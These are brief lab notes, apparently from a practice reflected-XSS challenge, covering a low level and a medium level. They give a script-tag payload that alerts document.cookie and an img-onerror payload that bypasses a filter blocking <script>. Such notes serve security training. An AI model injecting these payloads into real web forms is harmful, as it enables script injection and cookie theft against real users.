# Low
- basic web form with a field we can fill out.
- input a name into the field and click the "Submit" button, we see the string "Hello [inputted_name]" returned back to us.
- cause an alert popup to occur using this field?
- ```
  <script>alert(document.cookie)</script>
  ```
# medium
- clicking the "View Source" button on the bottom right of the challenge.
- <script> is rejected on this level
- 
- ```
  <img src/onerror=alert('XSS+Reflected')>
  ```
- will work
  
